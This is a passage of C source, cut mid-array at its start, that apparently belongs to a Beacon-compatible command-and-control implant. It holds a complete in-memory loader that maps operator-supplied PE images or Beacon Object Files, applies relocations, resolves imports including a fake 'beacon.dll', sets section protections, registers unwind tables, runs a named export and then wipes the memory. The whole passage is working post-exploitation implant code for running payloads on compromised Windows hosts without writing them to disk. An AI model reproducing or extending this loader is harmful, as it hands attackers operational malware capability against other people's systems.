	{ "BeaconRemoveValue",              offsetof(BOFF_FUNCTIONS, BeaconRemoveValue) },
	{ "BeaconDataStoreGetItem",         offsetof(BOFF_FUNCTIONS, BeaconDataStoreGetItem) },
	{ "BeaconDataStoreProtectItem",     offsetof(BOFF_FUNCTIONS, BeaconDataStoreProtectItem) },
	{ "BeaconDataStoreUnprotectItem",   offsetof(BOFF_FUNCTIONS, BeaconDataStoreUnprotectItem) },
	{ "BeaconDataStoreMaxEntries",      offsetof(BOFF_FUNCTIONS, BeaconDataStoreMaxEntries) },
	{ "BeaconGetCustomUserData",        offsetof(BOFF_FUNCTIONS, BeaconGetCustomUserData) },
};

static void * bofpe_resolve_api(BOFF_FUNCTIONS * f, const char * name) {
	size_t i;
	for (i = 0; i < sizeof(bofpe_apis) / sizeof(bofpe_apis[0]); i++) {
		if (strcmp(bofpe_apis[i].name, name) == 0)
			return (void *)((char *)f + bofpe_apis[i].off);
	}
	return NULL;
}

static BOOL bofpe_rva_ok(char * base, SIZE_T image, DWORD rva, DWORD size) {
	return rva != 0 && (SIZE_T)rva + size <= image;
}

static BOOL bofpe_relocate(char * base, SIZE_T image, IMAGE_NT_HEADERS * nt) {
	IMAGE_BASE_RELOCATION * rel;
	char * endp;
	SIZE_T delta = (SIZE_T)base - (SIZE_T)nt->OptionalHeader.ImageBase;
	DWORD dirSize;
	IMAGE_DATA_DIRECTORY dir = nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];

	if (delta == 0 || dir.VirtualAddress == 0)
		return TRUE;
	if (!bofpe_rva_ok(base, image, dir.VirtualAddress, dir.Size))
		return TRUE; /* no relocs to apply - trust the linker */

	dirSize = dir.Size;
	rel = (IMAGE_BASE_RELOCATION *)(base + dir.VirtualAddress);
	endp = (char *)rel + dirSize;

	while ((char *)rel + sizeof(IMAGE_BASE_RELOCATION) <= endp && rel->SizeOfBlock >= sizeof(IMAGE_BASE_RELOCATION)) {
		int count = (rel->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(WORD);
		WORD * entry = (WORD *)((char *)rel + sizeof(IMAGE_BASE_RELOCATION));
		char * page = base + rel->VirtualAddress;

		while (count-- > 0) {
			int type = (*entry) >> 12;
			int offs = (*entry) & 0xFFF;
			char * target = page + offs;
			entry++;

			if ((SIZE_T)(target - base) + 8 > image)
				return FALSE;

			if (type == IMAGE_REL_BASED_DIR64)
				*(UINT64 *)target += (UINT64)delta;
			else if (type == IMAGE_REL_BASED_HIGHLOW)
				*(DWORD *)target += (DWORD)delta;
			else if (type == IMAGE_REL_BASED_ABSOLUTE)
				continue;
			else
				return FALSE;
		}
		rel = (IMAGE_BASE_RELOCATION *)((char *)rel + rel->SizeOfBlock);
	}
	return TRUE;
}

static BOOL bofpe_imports(BOFF_FUNCTIONS * f, char * base, SIZE_T image, IMAGE_NT_HEADERS * nt) {
	IMAGE_DATA_DIRECTORY dir = nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT];
	IMAGE_IMPORT_DESCRIPTOR * desc;

	if (dir.VirtualAddress == 0)
		return TRUE;
	if (!bofpe_rva_ok(base, image, dir.VirtualAddress, dir.Size))
		return FALSE;

	desc = (IMAGE_IMPORT_DESCRIPTOR *)(base + dir.VirtualAddress);
	while (desc->Name != 0) {
		char * dllName;
		HMODULE mod = NULL;
		BOOL isBeacon = FALSE;

		if (!bofpe_rva_ok(base, image, desc->Name, 2))
			return FALSE;
		dllName = base + desc->Name;

		if (_stricmp(dllName, "beacon.dll") == 0) {
			isBeacon = TRUE;
		}
		else {
			mod = f->GetModuleHandleA(dllName);
			if (mod == NULL)
				mod = f->LoadLibraryA(dllName);
			if (mod == NULL) {
				post_error(0x51, "%s", dllName);
				return FALSE;
			}
		}

		{
			IMAGE_THUNK_DATA * oft = (IMAGE_THUNK_DATA *)(desc->OriginalFirstThunk
				? base + desc->OriginalFirstThunk : base + desc->FirstThunk);
			IMAGE_THUNK_DATA * iat = (IMAGE_THUNK_DATA *)(base + desc->FirstThunk);

			while (iat != NULL && oft->u1.AddressOfData != 0) {
				void * proc = NULL;
				if (oft->u1.Ordinal & IMAGE_ORDINAL_FLAG) {
					proc = (void *)f->GetProcAddress(mod, (LPCSTR)(oft->u1.Ordinal & 0xFFFF));
					if (proc == NULL) {
						post_error(0x52, "%s!#%lu", dllName, (unsigned long)(oft->u1.Ordinal & 0xFFFF));
						return FALSE;
					}
				}
				else {
					IMAGE_IMPORT_BY_NAME * byName;
					if (!bofpe_rva_ok(base, image, (DWORD)oft->u1.AddressOfData, 3)) {
						post_error_na(0x4d);
						return FALSE;
					}
					byName = (IMAGE_IMPORT_BY_NAME *)(base + oft->u1.AddressOfData);
					if (isBeacon) {
						proc = bofpe_resolve_api(f, (char *)byName->Name);
					}
					else {
						proc = (void *)f->GetProcAddress(mod, (char *)byName->Name);
					}
					if (proc == NULL) {
						post_error(0x52, "%s!%s", dllName, (char *)byName->Name);
						return FALSE;
					}
				}
				*(void **)&iat->u1.Function = proc;
				oft++;
				iat++;
			}
		}
		desc++;
	}
	return TRUE;
}

static void * bofpe_find_export(char * base, SIZE_T image, IMAGE_NT_HEADERS * nt, const char * name, int namelen) {
	IMAGE_DATA_DIRECTORY dir = nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];
	IMAGE_EXPORT_DIRECTORY * exp;
	DWORD * names, * funcs;
	WORD * ords;
	int i;

	if (dir.VirtualAddress == 0)
		return NULL;
	if (!bofpe_rva_ok(base, image, dir.VirtualAddress, dir.Size))
		return NULL;
	exp = (IMAGE_EXPORT_DIRECTORY *)(base + dir.VirtualAddress);
	if (!bofpe_rva_ok(base, image, exp->AddressOfNames, exp->NumberOfNames * 4))
		return NULL;
	names = (DWORD *)(base + exp->AddressOfNames);
	if (!bofpe_rva_ok(base, image, exp->AddressOfFunctions, exp->NumberOfFunctions * 4))
		return NULL;
	funcs = (DWORD *)(base + exp->AddressOfFunctions);
	if (!bofpe_rva_ok(base, image, exp->AddressOfNameOrdinals, exp->NumberOfNames * 2))
		return NULL;
	ords = (WORD *)(base + exp->AddressOfNameOrdinals);

	for (i = 0; i < (int)exp->NumberOfNames; i++) {
		char * cand;
		if (!bofpe_rva_ok(base, image, names[i], namelen + 1))
			continue;
		cand = base + names[i];
		if (strncmp(cand, name, namelen) == 0 && cand[namelen] == 0) {
			if (!bofpe_rva_ok(base, image, funcs[ords[i]], 1))
				return NULL;
			return base + funcs[ords[i]];
		}
	}
	return NULL;
}

static void bofpe_section_perms(char * base, IMAGE_NT_HEADERS * nt) {
	IMAGE_SECTION_HEADER * sec = IMAGE_FIRST_SECTION(nt);
	int i;
	DWORD oldp = 0;

	VirtualProtect(base, nt->OptionalHeader.SizeOfHeaders, PAGE_READWRITE, &oldp);
	for (i = 0; i < nt->FileHeader.NumberOfSections; i++) {
		DWORD fl = sec[i].Characteristics;
		DWORD prot, size;
		char * at;
		if (sec[i].SizeOfRawData == 0 && sec[i].Misc.VirtualSize == 0)
			continue;
		prot = PAGE_READONLY;
		if (fl & IMAGE_SCN_MEM_WRITE)
			prot = PAGE_READWRITE;
		if (fl & IMAGE_SCN_MEM_EXECUTE) {
			prot = (fl & IMAGE_SCN_MEM_WRITE) ? PAGE_EXECUTE_READWRITE : PAGE_EXECUTE_READ;
			if (fl & IMAGE_SCN_MEM_DISCARDABLE)
				prot = PAGE_EXECUTE_READ;
		}
		at = base + sec[i].VirtualAddress;
		size = sec[i].Misc.VirtualSize ? sec[i].Misc.VirtualSize : sec[i].SizeOfRawData;
		VirtualProtect(at, size, prot, &oldp);
	}
}

/* map, resolve, execute and tear down one BOF-PE image */
void command_inline_execute_pe(char * pe, int pelen, char * entryName, int entryLen, char * args, int alen) {
	IMAGE_DOS_HEADER * dos;
	IMAGE_NT_HEADERS * nt;
	IMAGE_SECTION_HEADER * sec;
	char * base = NULL;
	SIZE_T image;
	int how = 0;
	int i;
	BOFF_FUNCTIONS * ftable = NULL;
	void (*entry)(char *, int);
	BOOL ok = TRUE;
#if defined _M_X64
	BOOL fnTableAdded = FALSE;
	void (WINAPI *pRtlAddFunctionTable)(void *, DWORD, UINT64) = NULL;
	BOOL (WINAPI *pRtlDeleteFunctionTable)(void *) = NULL;
#endif

	if (pelen < (int)sizeof(IMAGE_DOS_HEADER)) {
		post_error_na(0x50);
		return;
	}
	dos = (IMAGE_DOS_HEADER *)pe;
	if (dos->e_magic != IMAGE_DOS_SIGNATURE || dos->e_lfanew <= 0
	    || pelen < dos->e_lfanew + (int)sizeof(IMAGE_NT_HEADERS)) {
		post_error_na(0x50);
		return;
	}
	nt = (IMAGE_NT_HEADERS *)(pe + dos->e_lfanew);
	if (nt->Signature != IMAGE_NT_SIGNATURE
#if defined _M_X64
	    || nt->FileHeader.Machine != IMAGE_FILE_MACHINE_AMD64
#elif defined _M_IX86
	    || nt->FileHeader.Machine != IMAGE_FILE_MACHINE_I386
#endif
	   ) {
		post_error_na(0x50);
		return;
	}
	image = nt->OptionalHeader.SizeOfImage;
	if (image == 0 || image > (SIZE_T)0x10000000) { /* 256MB sanity cap */
		post_error_na(0x50);
		return;
	}
	/* every section's raw data must live inside the supplied buffer */
	sec = IMAGE_FIRST_SECTION(nt);
	for (i = 0; i < nt->FileHeader.NumberOfSections; i++) {
		if ((SIZE_T)sec[i].PointerToRawData + sec[i].SizeOfRawData > (SIZE_T)pelen) {
			post_error_na(0x50);
			return;
		}
	}

	base = bof_alloc(image, &how);
	if (base == NULL) {
		post_error_na(0x50);
		return;
	}
	memset(base, 0, image);
	memcpy(base, pe, nt->OptionalHeader.SizeOfHeaders);
	sec = IMAGE_FIRST_SECTION(nt);
	for (i = 0; i < nt->FileHeader.NumberOfSections; i++) {
		if (sec[i].PointerToRawData && sec[i].SizeOfRawData)
			memcpy(base + sec[i].VirtualAddress, pe + sec[i].PointerToRawData, sec[i].SizeOfRawData);
	}

	/* headers are mapped: re-derive nt against the mapping */
	nt = (IMAGE_NT_HEADERS *)(base + dos->e_lfanew);

	ftable = (BOFF_FUNCTIONS *)malloc(sizeof(BOFF_FUNCTIONS));
	if (ftable == NULL) {
		bof_free(base, how);
		return;
	}
	setup_functions(ftable);

	ok = bofpe_relocate(base, image, nt);
	if (!ok) {
		post_error_na(0x4d);
		goto cleanup;
	}
	ok = bofpe_imports(ftable, base, image, nt);
	if (!ok)
		goto cleanup;

	bofpe_section_perms(base, nt);

#if defined _M_X64
	{
		IMAGE_DATA_DIRECTORY ex = nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXCEPTION];
		if (ex.VirtualAddress && ex.Size >= sizeof(RUNTIME_FUNCTION)) {
			HMODULE ntdll = GetModuleHandleA("ntdll.dll");
			if (ntdll != NULL) {
				pRtlAddFunctionTable = (void (WINAPI *)(void *, DWORD, UINT64))
					(void *)GetProcAddress(ntdll, "RtlAddFunctionTable");
				pRtlDeleteFunctionTable = (BOOL (WINAPI *)(void *))
					(void *)GetProcAddress(ntdll, "RtlDeleteFunctionTable");
			}
			if (pRtlAddFunctionTable != NULL
			    && pRtlAddFunctionTable(base + ex.VirtualAddress, ex.Size / sizeof(RUNTIME_FUNCTION), (UINT64)base)) {
				fnTableAdded = TRUE;
			}
		}
	}
#endif

	if (entryName == NULL || entryLen <= 0) {
		entryName = "go";
		entryLen = 2;
	}
	entry = (void (*)(char *, int))bofpe_find_export(base, image, nt, entryName, entryLen);
	if (entry == NULL) {
		post_error(0x53, "%.*s", entryLen, entryName);
		ok = FALSE;
		goto cleanup;
	}

	if (nt->FileHeader.Characteristics & IMAGE_FILE_DLL) {
		BOOL (WINAPI * dllmain)(void *, DWORD, void *);
		dllmain = (BOOL (WINAPI *)(void *, DWORD, void *))(base + nt->OptionalHeader.AddressOfEntryPoint);
		if (dllmain != NULL)
			dllmain((void *)base, DLL_PROCESS_ATTACH, NULL);
	}

	entry(args, alen);

cleanup:
#if defined _M_X64
	if (fnTableAdded && pRtlDeleteFunctionTable != NULL) {
		IMAGE_DATA_DIRECTORY ex2 = nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXCEPTION];
		pRtlDeleteFunctionTable(base + ex2.VirtualAddress);
	}
#endif
	{
		DWORD oldrw = 0;
		VirtualProtect(base, image, PAGE_READWRITE, &oldrw);
	}
	memset(base, 0, image);
	bof_free(base, how);
	bof_free_slot_table(ftable);
	memset(ftable, 0, sizeof(*ftable));
	free(ftable);
	(void)ok;
}

void command_inline_execute_object(char * buffer, int length) {
	datap parser;
	datap_buffer code, relocs;
	DWORD entry;
	datap_buffer args;
	int prefix_len;

	data_init(&parser, buffer, length);
	prefix_len = data_int(&parser);  /* bssSize (BOF) / BOFPE_MAGIC (PE) */
	code = data_extract(&parser);    /* code (BOF) / whole PE image (PE) */
	data_extract(&parser);           /* rdata */
	data_extract(&parser);           /* data */
	data_extract(&parser);           /* xdata */
	data_extract(&parser);           /* pdata */
	relocs = data_extract(&parser);  /* relocs (BOF) / entry export name (PE) */
	if (prefix_len == BOFPE_MAGIC) {
		entry = data_int(&parser);   /* unused for PE */
		args = data_extract(&parser);
		command_inline_execute_pe(code.buffer, code.length,
		                          relocs.buffer, relocs.length,
		                          args.buffer, args.length);
		return;
	}
	/* re-parse the normal BOF shape (parser already consumed prefix_len) */
	{
		datap p2;
		data_init(&p2, buffer, length);
		data_int(&p2);
		data_extract(&p2);
		data_extract(&p2);
		data_extract(&p2);
		data_extract(&p2);
		data_extract(&p2);
		data_extract(&p2);
		prefix_len = length - p2.length;
	}
	entry = data_int(&parser);
	args = data_extract(&parser);
	command_inline_execute_object_parsed(buffer, prefix_len, entry, args.buffer, args.length, 0);
}